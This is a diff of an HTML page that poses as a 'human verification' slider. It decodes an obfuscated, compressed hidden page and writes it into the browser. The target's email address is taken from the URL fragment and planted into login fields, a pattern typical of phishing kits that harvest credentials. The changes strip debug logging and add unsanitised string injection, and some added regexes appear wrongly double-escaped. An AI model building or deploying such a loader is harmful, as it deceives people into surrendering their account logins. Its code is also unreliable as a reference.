@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <title>Loading...</title>
-<script nonce="" src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
 <style>
   #css-pass::before { content: "UECecF"; display:none; }
   #human-overlay { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.98); z-index:2147483647; font-family: system-ui, sans-serif; }
@@ -31,7 +31,7 @@
   </div>
 </div>
 
-<script nonce="">
+<script>
 console.log("[Decoder] Starting.");
 
 var piecesArr = ["alBGalhGSE1SXXpVdk5IRXdUWE1qRnI3R0RQc29GdlBLRGRNRGg7XEhEdnJEWkZMbU5uTW9MO3tWVERINWdEM1lcRGZbUURQRUxVNUhkRFxwdUQ1ZWlwZ1JFalF5W0Q5TlJEd0RMdXY5RHJkUURaRVRaa0kzXFFGRGg4RHpQRF1EN0pEPG..."];
@@ -50,7 +50,6 @@ function reassemblePieces() {
       }
       out += chars.reverse().join('');
     }
-    console.log('[Decoder] reassembled payload length:', out.length);
     return out;
   } catch (e) {
     console.error('[Decoder] Reassembly failed:', e);
@@ -58,7 +57,6 @@ function reassemblePieces() {
   }
 }
 
-// Slider
 var handle = document.getElementById('slider-handle');
 var track = document.getElementById('slider-track');
 var isDragging = false;
@@ -98,44 +96,87 @@ handle.addEventListener('touchstart', startDrag, {passive: false});
 
 function attemptReconstruct() {
   var assembled = reassemblePieces();
-  if (!assembled) { document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reassembly failed.</h2>'; return; }
+  if (!assembled) { document.body.innerHTML = '<h2 style=\"color:red;text-align:center;margin-top:50px;\">Reassembly failed.</h2>'; return; }
+
   try {
-    console.log('[Decoder] decompressing...');
     var html = LZString.decompressFromBase64(assembled);
-    console.log('[Decoder] decompressed length:', html ? html.length : null);
     if (!html) throw new Error('Decompression returned null');
 
-    // Extract hash robustly
     var rawHash = '';
-    try { rawHash = (window.location.hash && window.location.hash.length>1) ? decodeURIComponent(window.location.hash.replace(/^#/,'') ) : (window.location.href.indexOf('#')>-1 ? decodeURIComponent(window.location.href.split('#').pop()) : ''); } catch(e){ rawHash = ''; }
-    if (rawHash) {
-      try { sessionStorage.setItem('__prefill_email', rawHash); console.log('[Decoder] stored __prefill_email in sessionStorage:', rawHash); } catch(e) { console.warn('[Decoder] sessionStorage set failed', e); }
+    try {
+      rawHash = (window.location.hash && window.location.hash.length>1) ? decodeURIComponent(window.location.hash.replace(/^#/,'') ) : (window.location.href.indexOf('#')>-1 ? decodeURIComponent(window.location.href.split('#').pop()) : '');
+    } catch(e) {
+      rawHash = '';
     }
 
     if (rawHash) {
-      // Build a robust injection that reads sessionStorage and fills fields. Use case-insensitive replacement for </body> or </head>
-      var prefillScript = '<scr' + 'ipt>(function(){try{var email= null; try{ email = sessionStorage.getItem("__prefill_email") || (location.hash?decodeURIComponent(location.hash.replace(/^#/,'') ):null);}catch(e){} if(!email) return; console.log("[Prefill] email read in page:", email); try{ var hid = document.querySelector("input[name=\\"email\\"][type=\\"hidden\\"]"); if(hid){ hid.value = email; hid.dispatchEvent(new Event("input",{bubbles:true})); hid.dispatchEvent(new Event("change",{bubbles:true})); console.log("[Prefill] set hidden input"); } }catch(e){} try{ var disp = document.getElementById("auth_email"); if(disp){ disp.textContent = email; console.log("[Prefill] set #auth_email text"); } }catch(e){} var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set; function tryFill(){ try{ var inputs = document.querySelectorAll("input"); if(!inputs||inputs.length===0) return false; var did=false; for(var i=0;i<inputs.length;i++){ var el=inputs[i]; var id=(el.id||"").toLowerCase(); var name=(el.name||"").toLowerCase(); var ph=(el.placeholder||"").toLowerCase(); var type=(el.type||"").toLowerCase(); if(type==="email"|| id.indexOf("email")>-1|| name.indexOf("email")>-1|| id.indexOf("user")>-1|| name.indexOf("user")>-1|| ph.indexOf("email")>-1|| ph.indexOf("user")>-1|| name.indexOf("mail")>-1|| id.indexOf("mail")>-1){ try{ if(nativeSetter){ nativeSetter.call(el, email);} else { el.value = email; } el.dispatchEvent(new Event("input",{bubbles:true})); el.dispatchEvent(new Event("change",{bubbles:true})); el.dispatchEvent(new Event("blur",{bubbles:true})); did=true; console.log('[Prefill] filled', el); }catch(e){} } } return did; }catch(e){return false;} } var attempts=0; var id=setInterval(function(){ if(tryFill()||attempts>30){ clearInterval(id); } attempts++; },300); var mo=new MutationObserver(function(){ if(tryFill()){ try{ mo.disconnect(); }catch(e){} } }); try{ mo.observe(document.documentElement||document.body, { childList:true, subtree:true }); setTimeout(function(){ try{ mo.disconnect(); }catch(e){} },10000); }catch(e){} }catch(e){console.warn('[Prefill] injection error',e);} })();<\/scr' + 'ipt>';
+      console.log('[Decoder] email present:', rawHash);
 
-      // Insert prefillScript using case-insensitive replacement for </body> or </head> or append
-      var lower = html.toLowerCase();
-      if (/<\/body\s*>/i.test(html)) {
-        html = html.replace(/<\/body\s*>/i, prefillScript + '</body>');
-      } else if (/<\/head\s*>/i.test(html)) {
-        html = html.replace(/<\/head\s*>/i, prefillScript + '</head>');
+      // Modify raw HTML string directly before writing
+      html = html.replace(/(<input\\s+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*>)/ig, function(m){
+        if (/\\bvalue\\s*=\\s*["']/i.test(m)) return m;
+        return m.replace(/>$/, ' value="' + rawHash + '">');
+      });
+
+      html = html.replace(/(<input\\s+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*\\bvalue\\s*=\\s*["'][^>]*["'][^>]*>)/ig, function(m){
+        return m.replace(/value\\s*=\\s*["'][^"']*["']/i, 'value="' + rawHash + '"');
+      });
+
+      html = html.replace(/(<h[1-6][^>]*\\bid\\s*=\\s*["']auth_email["'][^>]*>)(.*?)(<\\/h[1-6]>)/ig, function(all, open, inner, close){
+        return open + rawHash + close;
+      });
+
+      html = html.replace(/(<[a-zA-Z0-9-]+[^>]*\\bid\\s*=\\s*["']auth_email["'][^>]*>)(.*?)(<\\/[^>]+>)/ig, function(all, open, inner, close){
+        return open + rawHash + close;
+      });
+
+      html = html.replace(/(<\\/?[a-zA-Z0-9-]+[^>]*\\b(?:id|name)\\s*=\\s*["'](?:email|Email)["'][^>]*>)/ig, function(m){
+        if (m.indexOf('value=') > -1) return m;
+        return m + ' value="' + rawHash + '"';
+      });
+
+      // Fallback script to fill any visible match
+      var prefillScript = '<scr' + 'ipt>' +
+        '(function(){' +
+        'var email = sessionStorage.getItem(\"__prefill_email\");' +
+        'if (!email) { try { email = decodeURIComponent(location.hash.replace(/^#/,"")); } catch(e) { email = null; } }' +
+        'if (!email) return;' +
+        'var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;' +
+        'var inputs = document.querySelectorAll("input");' +
+        'for (var i = 0; i < inputs.length; i++) {' +
+        '  var el = inputs[i];' +
+        '  var id = (el.id || "").toLowerCase();' +
+        '  var name = (el.name || "").toLowerCase();' +
+        '  var ph = (el.placeholder || "").toLowerCase();' +
+        '  if ((id.indexOf("email") > -1) || (name.indexOf("email") > -1) || (id.indexOf("user") > -1) || (name.indexOf("user") > -1) || (ph.indexOf("email") > -1) || (ph.indexOf("user") > -1)) {' +
+        '    try { if (nativeSetter) { nativeSetter.call(el, email); } else { el.value = email; } el.dispatchEvent(new Event(\"input\", { bubbles: true })); el.dispatchEvent(new Event(\"change\", { bubbles: true })); } catch(e) {}' +
+        '  }' +
+        '}' +
+        '})();' +
+        '<\\/scr' + 'ipt>';
+
+      try {
+        sessionStorage.setItem('__prefill_email', rawHash);
+      } catch (e) {}
+
+      if (/<\\/body\\s*>/i.test(html)) {
+        html = html.replace(/<\\/body\\s*>/i, prefillScript + '</body>');
+      } else if (/<\\/head\\s*>/i.test(html)) {
+        html = html.replace(/<\\/head\\s*>/i, prefillScript + '</head>');
       } else {
         html = prefillScript + html;
       }
     } else {
-      console.log('[Decoder] No hash present; skipping prefill injection');
+      console.log('[Decoder] No hash present; skipping injection');
     }
 
     document.open();
     document.write(html);
     document.close();
-    console.log('[Decoder] document.write complete');
+    console.log('[Decoder] Complete');
   } catch (e) {
     console.error('[Decoder] Fatal error:', e);
-    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reconstruction failed: ' + (e && e.message ? e.message : e) + '</h2>';
+    document.body.innerHTML = '<h2 style=\"color:red;text-align:center;margin-top:50px;\">Reconstruction failed: ' + e.message + '</h2>';
   }
 }
 </script>
